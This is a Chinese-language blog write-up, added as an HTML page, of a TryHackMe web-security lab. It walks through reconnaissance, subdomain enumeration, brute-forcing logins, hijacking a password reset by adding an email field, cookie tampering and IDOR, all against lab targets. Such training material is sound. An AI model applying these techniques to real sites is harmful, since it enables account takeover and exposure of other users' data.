@@ -1,0 +1,821 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[THM] Walking An Application | cl1mb3r的小站</title><meta name="author" content="cl1mb3r"><meta name="copyright" content="cl1mb3r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Walking An Application Viewing The Page Source  查看网页源代码发现首行注释，访问后边的目录。  发现第一段flag  继续向下看，发现a标签里的secret-page跟踪这个页面。  发现第二段flag  同时发现这里的asset，跟踪访问一下。  发现第三段flag  继续向下，发现了网站框架信息。 跟踪这个框架网站。  发现历史漏洞造成的信息泄露">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[THM] Walking An Application">
+<meta property="og:url" content="http://example.com/2024/04/12/application/index.html">
+<meta property="og:site_name" content="cl1mb3r的小站">
+<meta property="og:description" content="Walking An Application Viewing The Page Source  查看网页源代码发现首行注释，访问后边的目录。  发现第一段flag  继续向下看，发现a标签里的secret-page跟踪这个页面。  发现第二段flag  同时发现这里的asset，跟踪访问一下。  发现第三段flag  继续向下，发现了网站框架信息。 跟踪这个框架网站。  发现历史漏洞造成的信息泄露">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/test1.png">
+<meta property="article:published_time" content="2024-04-12T06:31:02.000Z">
+<meta property="article:modified_time" content="2024-04-14T06:17:02.872Z">
+<meta property="article:author" content="cl1mb3r">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/test1.png"><link rel="shortcut icon" href="/img/test1.png"><link rel="canonical" href="http://example.com/2024/04/12/application/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[THM] Walking An Application',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-14 14:17:02'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/test1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="cl1mb3r的小站"><img class="site-icon" src="/img/test1.png"/><span class="site-name">cl1mb3r的小站</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[THM] Walking An Application</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-12T06:31:02.000Z" title="发表于 2024-04-12 14:31:02">2024-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-14T06:17:02.872Z" title="更新于 2024-04-14 14:17:02">2024-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="[THM] Walking An Application"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Walking-An-Application"><a href="#Walking-An-Application" class="headerlink" title="Walking An Application"></a>Walking An Application</h1>
+<h2 id="Viewing-The-Page-Source"><a href="#Viewing-The-Page-Source" class="headerlink" title="Viewing The Page Source"></a>Viewing The Page Source</h2>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fae50cb1.png" alt="image-20240412143405013.png"></p>
+<p>查看网页源代码发现首行注释，访问后边的目录。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6faca16b9.png" alt="image-20240412143506363.png"></p>
+<p>发现第一段<code>flag</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fad9ec6a.png" alt="image-20240412143540836.png"></p>
+<p>继续向下看，发现<code>a标签</code>里的<code>secret-page</code>跟踪这个页面。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa9859b2.png" alt="image-20240412143615885.png"></p>
+<p>发现第二段<code>flag</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fab22533.png" alt="image-20240412143654591.png"></p>
+<p>同时发现这里的<code>asset</code>，跟踪访问一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6faa4ca1d.png" alt="image-20240412143812393.png"></p>
+<p>发现第三段<code>flag</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa8d6903.png" alt="image-20240412143842008.png"></p>
+<p>继续向下，发现了网站框架信息。</p>
+<p>跟踪这个框架网站。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb9d9700.png" alt="image-20240412144023007.png"></p>
+<p>发现历史漏洞造成的信息泄露，这里回去尝试访问一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa4e543e.png" alt="image-20240412144133729.png"></p>
+<p>发现最后一段<code>flag</code></p>
+<h2 id="Developer-Tools-Inspector"><a href="#Developer-Tools-Inspector" class="headerlink" title="Developer Tools - Inspector"></a>Developer Tools - Inspector</h2>
+<p>首先打开网站的<code>news</code>界面。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa3d9847.png" alt="image-20240412144258712.png"></p>
+<p>这里提示，我们访问第三段新闻获得<code>flag</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa612658.png" alt="image-20240412144330033.png"></p>
+<p>我们直接打开发现，被拦截。</p>
+<p>再这个界面，右键检查一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa2a1e77.png" alt="image-20240412144413489.png"></p>
+<p>可以看到对应的<code>css</code>中的<code>display</code>属性为<code>block</code>。</p>
+<p>我们将这里的<code>block</code>修改为<code>none</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb8967ff.png" alt="image-20240412144458834.png"></p>
+<p>成功访问到这个页面，获得第一个<code>flag</code></p>
+<h2 id="Developer-Tools-Debugger"><a href="#Developer-Tools-Debugger" class="headerlink" title="Developer Tools - Debugger"></a>Developer Tools - Debugger</h2>
+<p>根据提示，访问<code>concat</code>界面，按照提示说加载页面时会有一个闪动的动画(不好意思，多次测试都没发现),然后我们修改<code>js</code>代码让他停止闪动，就能获得<code>flag</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb7a24c9.png" alt="image-20240412145109380.png"></p>
+<p>在这段代码上打上断点，重新加载。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa161010.png" alt="image-20240412145155529.png"></p>
+<p>页面上这时，加载出<code>flag</code></p>
+<h2 id="Developer-Tools-Network"><a href="#Developer-Tools-Network" class="headerlink" title="Developer Tools - Network"></a>Developer Tools - Network</h2>
+<p>根据提示，我们在<code>concat</code>界面点击<code>submit</code>按钮，追踪一下发送包。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa0b0ec1.png" alt="image-20240412145559977.png"></p>
+<p>发现<code>flag</code></p>
+<h1 id="Content-Discovery"><a href="#Content-Discovery" class="headerlink" title="Content Discovery"></a>Content Discovery</h1>
+<h2 id="Manual-Discovery-Robots-txt"><a href="#Manual-Discovery-Robots-txt" class="headerlink" title="Manual Discovery - Robots.txt"></a>Manual Discovery - Robots.txt</h2>
+<p>访问<code>robots.txt</code></p>
+<p>发现内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Disallow: /staff-portal</span><br></pre></td></tr></table></figure>
+<p>可见爬虫不可见的目录是<code>staff-portal</code></p>
+<h2 id="Manual-Discovery-Favicon"><a href="#Manual-Discovery-Favicon" class="headerlink" title="Manual Discovery - Favicon"></a>Manual Discovery - Favicon</h2>
+<p>这里主要提示我们，在渗透活动中，靶标的<code>icon</code>信息可能会提供一些网站框架的相关信息，需要我们注意。</p>
+<p>访问这个网页，查看源代码</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9fb5bc4.png" alt="image-20240412150501006.png"></p>
+<p>发现<code>icon</code>信息，下载这个<code>icon</code>然后在线计算下<code>md5</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9a3b551.png" alt="image-20240412150650911.png"></p>
+<p>在<a target="_blank" rel="noopener" href="https://wiki.owasp.org/index.php/OWASP_favicon_database">OWASP_favicon_database</a>查找到这个<code>icon</code>对应的框架是<code>cgiirc</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9c93c11.png" alt="image-20240412150707959.png"></p>
+<h2 id="Manual-Discovery-Sitemap-xml"><a href="#Manual-Discovery-Sitemap-xml" class="headerlink" title="Manual Discovery - Sitemap.xml"></a>Manual Discovery - Sitemap.xml</h2>
+<p>与限制搜索引擎爬虫可以查看的内容的 <code>robots.txt</code> 文件不同，<code>sitemap.xml</code> 文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。这些有时可能包含网站中更难导航到的区域，甚至列出当前网站不再使用但仍在幕后工作的一些旧网页。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9819343.png" alt="image-20240412152115968.png"></p>
+<p>访问这个网站的<code>sitemap.xml</code>发现了敏感文件。</p>
+<h2 id="Manual-Discovery-HTTP-Headers"><a href="#Manual-Discovery-HTTP-Headers" class="headerlink" title="Manual Discovery - HTTP Headers"></a>Manual Discovery - HTTP Headers</h2>
+<p>当我们向 Web 服务器发出请求时，服务器会返回各种 HTTP 标头。这些标头有时可以包含有用的信息，例如 Web 服务器中间件，操作系统，以及可能正在使用的编程/脚本语言。</p>
+<p>我们可以以用<code>curl -v</code>这个命令完成这个操作。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbdb4e9c.png" alt="image-20240412152354181.png"></p>
+<p>在响应包当中，发现目标服务器的操作系统<code>Ubuntu</code>，中间件是<code>nginx</code>，以及<code>flag</code>信息。</p>
+<h2 id="Manual-Discovery-Framework-Stack"><a href="#Manual-Discovery-Framework-Stack" class="headerlink" title="Manual Discovery - Framework Stack"></a>Manual Discovery - Framework Stack</h2>
+<p>这里提示我们在信息收集的时候，要关注相关网站的框架信息。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f96da18e.png" alt="image-20240412153113084.png"></p>
+<p>我们在页面查看源代码发现最后一个注释，这里说明了网站使用的框架和框架的官网，这里跟踪一下这个网页。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9601075.png" alt="image-20240412153214769.png"></p>
+<p>这个框架的官网提供了默认的用户名和口令，我们可以回去测试一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f93827ad.png" alt="image-20240412153319202.png"></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f928479d.png" alt="image-20240412153330201.png"></p>
+<p>成功登录获得<code>flag</code></p>
+<h2 id="OSINT-Google-Hacking-Dorking"><a href="#OSINT-Google-Hacking-Dorking" class="headerlink" title="OSINT - Google Hacking / Dorking"></a>OSINT - Google Hacking / Dorking</h2>
+<p>介绍了常见的<code>Google Hacking</code>语法</p>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Google_hacking">参考文章</a></p>
+<h2 id="OSINT-Wappalyzer"><a href="#OSINT-Wappalyzer" class="headerlink" title="OSINT - Wappalyzer"></a>OSINT - Wappalyzer</h2>
+<p>信息收集时可以用这个插件发现靶标系统的框架、CMS、编程语言等信息。</p>
+<h2 id="OSINT-Wayback-Machine"><a href="#OSINT-Wayback-Machine" class="headerlink" title="OSINT - Wayback Machine"></a>OSINT - Wayback Machine</h2>
+<p>Wayback Machine （<a target="_blank" rel="noopener" href="https://archive.org/web/%EF%BC%89">https://archive.org/web/）</a> 是一个可追溯到 90 年代后期的网站历史档案。您可以搜索域名，它会向您显示该服务抓取网页并保存内容的所有时间。这项服务可以帮助发现当前网站上可能仍处于活动状态的旧页面。</p>
+<p>这也是发现边缘资产的一种方法。</p>
+<h2 id="OSINT-GitHub"><a href="#OSINT-GitHub" class="headerlink" title="OSINT - GitHub"></a>OSINT - GitHub</h2>
+<p>要了解 GitHub，首先需要了解 Git。Git 是一个版本控制系统，用于跟踪项目中文件的更改。在团队中工作更容易，因为您可以看到每个团队成员正在编辑的内容以及他们对文件所做的更改。当用户完成更改后，他们会使用一条消息提交更改，然后将它们推送回中心位置（存储库），以便其他用户将这些更改拉取到其本地计算机。GitHub 是 Internet 上 Git 的托管版本。存储库可以设置为公共或私有，并具有各种访问控制。您可以使用 GitHub 的搜索功能查找公司名称或网站名称，以尝试找到属于您的目标的存储库。一旦被发现，您可能可以访问尚未找到的源代码、密码或其他内容。</p>
+<h2 id="OSINT-S3-Buckets"><a href="#OSINT-S3-Buckets" class="headerlink" title="OSINT - S3 Buckets"></a>OSINT - S3 Buckets</h2>
+<p>S3 存储桶是 Amazon AWS 提供的一项存储服务，允许人们将文件甚至静态网站内容保存在可通过 HTTP 和 HTTPS 访问的云中。文件的所有者可以设置访问权限，使文件公开、私有甚至可写。有时，这些访问权限设置不正确，并且无意中允许访问不应向公众提供的文件。S3 存储桶的格式为 http（s）：//{name}.s3.amazonaws.com 其中 {name} 由所有者决定，例如 <a target="_blank" rel="noopener" href="http://tryhackme-assets.s3.amazonaws.com">tryhackme-assets.s3.amazonaws.com</a>。可以通过多种方式发现 S3 存储桶，例如在网站的页面源、GitHub 存储库中查找 URL，甚至自动执行该过程。一种常见的自动化方法是使用公司名称，后跟 {name}-assets、{name}-www、{name}-public、{name}-private 等常用术语。</p>
+<p>(没用过不了解。。。)</p>
+<h2 id="Automated-Discovery"><a href="#Automated-Discovery" class="headerlink" title="Automated Discovery"></a>Automated Discovery</h2>
+<p>目录遍历这边常用的工具是，国产的<code>dirsearch</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbb80b65.png" alt="image-20240412154723575.png"></p>
+<p>这个<code>m</code>开头的扫不到，字典里没有这个。。。。</p>
+<h1 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h1>
+<p>这里主要说，在渗透活动中子域名枚举，可以帮助我们扩大攻击面，来尝试和发现更多的潜在漏洞。</p>
+<p>三种不同的子域名枚举方式：</p>
+<p>Brute Force(暴力破解)、OSINT(开源情报)、VirtualBox(虚拟主机)</p>
+<h2 id="OSINT-SSL-TLS-Certificates"><a href="#OSINT-SSL-TLS-Certificates" class="headerlink" title="OSINT - SSL/TLS Certificates"></a>OSINT - SSL/TLS Certificates</h2>
+<p>当 CA（证书颁发机构）为域创建 SSL/TLS（安全套接字层/传输层安全性）证书时，CA 将参与所谓的“证书透明度 （CT） 日志”。这些是为域名创建的每个 SSL/TLS 证书的可公开访问日志。证书透明度日志的目的是阻止使用恶意证书和意外制作的证书。我们可以利用这项服务来发现属于某个域的子域，<a target="_blank" rel="noopener" href="https://crt.sh">https://crt.sh</a> 和 <a target="_blank" rel="noopener" href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a> 等网站提供了一个可搜索的证书数据库，显示当前和历史结果。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f916cab1.png" alt="image-20240412155425197.png"></p>
+<p>我们可以在这个网站上查询到，<code>2020-12-26</code>注册的子域名是<code>store.tryhackme.com</code></p>
+<h2 id="OSINT-Search-Engines"><a href="#OSINT-Search-Engines" class="headerlink" title="OSINT - Search Engines"></a>OSINT - Search Engines</h2>
+<p>搜索引擎包含指向超过十亿个网站的数万亿个链接，这可能是寻找新子域的绝佳资源。在 Google 等网站上使用高级搜索方法（例如 site： filter）可以缩小搜索结果范围。例如，“-site:www.domain.com site：*.domain.com”将仅包含指向域名 <a target="_blank" rel="noopener" href="http://domain.com">domain.com</a> 的结果，但会排除任何指向 <a target="_blank" rel="noopener" href="http://www.domain.com">www.domain.com</a> 的链接;因此，它只向我们显示属于 <a target="_blank" rel="noopener" href="http://domain.com">domain.com</a> 的子域名。</p>
+<p>例如：</p>
+<p>我们可以在<code>Google</code>中搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-site:www.tryhackme.com site:*.tryhackme.com</span><br></pre></td></tr></table></figure>
+<p>这样就找到了<code>tryhackme</code>的子域名。</p>
+<h2 id="DNS-Bruteforce"><a href="#DNS-Bruteforce" class="headerlink" title="DNS Bruteforce"></a>DNS Bruteforce</h2>
+<p>暴力破解 DNS（域名系统）枚举是从常用子域的预定义列表中尝试数十个、数百个、数千个甚至数百万个不同的可能子域的方法。由于此方法需要许多请求，因此我们使用工具将其自动化以加快流程。</p>
+<h2 id="OSINT-Sublist3r"><a href="#OSINT-Sublist3r" class="headerlink" title="OSINT - Sublist3r"></a>OSINT - Sublist3r</h2>
+<p>为了加快 OSINT 子域发现的过程，我们可以借助 Sublist3r 等工具自动执行上述方法。</p>
+<h2 id="Virtual-Hosts"><a href="#Virtual-Hosts" class="headerlink" title="Virtual Hosts"></a>Virtual Hosts</h2>
+<p>某些子域并不总是托管在可公开访问的 DNS 结果中，例如 Web 应用程序或管理门户的开发版本。相反，DNS 记录可以保存在私有 DNS 服务器上，也可以记录在开发人员的机器上的 /etc/hosts 文件（或 Windows 用户的 c：windowssystem32driversetchosts 文件）中，该文件将域名映射到 IP 地址。</p>
+<p>由于当从客户端请求网站时，Web 服务器可以从一台服务器托管多个网站，因此服务器知道客户端希望从 Host 标头中获取哪个网站。我们可以通过对主机标头进行更改并监视响应来利用它，以查看我们是否发现了一个新网站。</p>
+<p>与DNS Bruteforce一样，我们可以通过使用常用子域的单词列表来自动执行此过程。</p>
+<h1 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h1>
+<h2 id="Username-Enumeration"><a href="#Username-Enumeration" class="headerlink" title="Username Enumeration"></a>Username Enumeration</h2>
+<p>用户名枚举，首先从官网的攻击机上边扒下来他的字典(不知道为什么他给的github里边没有这个wordlist)</p>
+<p>放到<code>BP</code>里边爆破一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8f31963.png" alt="image-20240412165807428.png"></p>
+<p>发现三个注册用户<code>simon</code>,<code>steve</code>，<code>robert</code></p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2>
+<p>依旧是放到<code>BP</code>中爆破。</p>
+<p>这里得到<code>steve/thunder</code></p>
+<h2 id="Logic-Flaw"><a href="#Logic-Flaw" class="headerlink" title="Logic Flaw"></a>Logic Flaw</h2>
+<p>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、绕过或操纵。逻辑缺陷可能存在于网站的任何区域。</p>
+<p>这个例题比较有意思，这里复现一下。</p>
+<p>首先注册一个自己的账号。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8e04686.png" alt="image-20240412174853879.png"></p>
+<p>这里会获得一个自己的邮箱账号。</p>
+<p>然后已知<code>robert</code>的邮箱账号是<code>robert@acmeitsupport.thm</code></p>
+<p>我们尝试重置一下<code>robert</code>的账户密码。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fa6ec1a9.png" alt="image-20240412175107659.png"></p>
+<p>这里<code>post</code>里边添加一个<code>email</code>字段指向自己的邮箱账号。（！！卧槽，居然是改这里，为什么不改GET后边的Email啊！！！）。</p>
+<p>这样登上自己邮箱账户，就能看到这个<code>robert</code>的重置账号信息。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8b9267d.png" alt="image-20240412175251305.png"></p>
+<p>访问这个<code>url</code>就能登录<code>robert</code>的账户，进而发现<code>flag</code></p>
+<h2 id="Cookie-Tampering"><a href="#Cookie-Tampering" class="headerlink" title="Cookie Tampering"></a>Cookie Tampering</h2>
+<p>在在线会话期间检查和编辑 Web 服务器设置的 cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8915471.png" alt="image-20240412180142091.png"></p>
+<p>按提示修改<code>cookie</code>就能拿到<code>flag</code></p>
+<h1 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h1>
+<p>这洞挖到都没地方收。。。</p>
+<p>IDOR 代表不安全的直接对象引用，是一种访问控制漏洞。</p>
+<p>当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）时，可能会发生此类漏洞，对输入数据的信任过多，并且未在服务器端进行验证以确认请求的对象属于请求它的用户。</p>
+<h2 id="An-IDOR-Example"><a href="#An-IDOR-Example" class="headerlink" title="An IDOR Example"></a>An IDOR Example</h2>
+<p>假设您刚刚注册了在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 <a target="_blank" rel="noopener" href="http://online-service.thm/profile?user_id=1305%EF%BC%8C%E6%82%A8%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%82%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://online-service.thm/profile?user_id=1305，您可以看到您的信息。</a></p>
+<p>好奇心占了上风，你尝试将user_id值更改为 1000 （<a target="_blank" rel="noopener" href="http://online-service.thm/profile?user_id=1000%EF%BC%89%EF%BC%8C%E4%BB%A4%E4%BD%A0%E6%83%8A%E8%AE%B6%E7%9A%84%E6%98%AF%EF%BC%8C%E4%BD%A0%E7%8E%B0%E5%9C%A8%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82%E6%82%A8%E7%8E%B0%E5%9C%A8%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA">http://online-service.thm/profile?user_id=1000），令你惊讶的是，你现在可以看到另一个用户的信息。您现在发现了一个</a> IDOR 漏洞！理想情况下，应该进行检查</p>
+<p>注册账号并登录</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8a5ee14.png" alt="image-20240412181202663.png"></p>
+<p>在<code>Your Account</code>这里发现了可疑<code>api</code></p>
+<p>将后边的<code>id=15</code>修改为<code>id=1</code>发现了一号用户的敏感信息</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8864a8a.png" alt="image-20240412181310422.png"></p>
+<p>修改成其他数字，都能看到对应用户的相关信息。</p>
+<h1 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h1>
+<h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2>
+<h3 id="What-is-File-inclusion"><a href="#What-is-File-inclusion" class="headerlink" title="What is File inclusion?"></a>What is File inclusion?</h3>
+<p>这个介绍写的还是不错的，简单翻译一下。</p>
+<p>有时候，我们会遇到一些web程序，需要通过参数来获得给定系统中一些文件包括图片、静态文字的访问权限。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行操作。下图分解了 URL 的基本部分。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9de46c8.png" alt="image-20240412182619123.png"></p>
